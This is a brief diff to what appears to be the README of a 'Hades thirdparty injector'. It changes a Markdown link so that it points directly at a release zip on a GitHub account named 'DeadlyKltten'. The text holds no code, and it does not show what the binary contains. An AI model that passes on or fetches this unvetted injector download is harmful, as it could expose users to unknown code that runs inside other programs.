@@ -1,5 +1,5 @@
 # Hades thirdparty injector
-[Download Injector]: https://github.com/DeadlyKltten/Hades-thirdparty-injector/releases/download/2.3.1/
+[Download Injector](https://github.com/DeadlyKltten/Hades-thirdparty-injector/releases/download/2.3.1/Injector-V2.3.1.zip)
 
 
 ## Setup
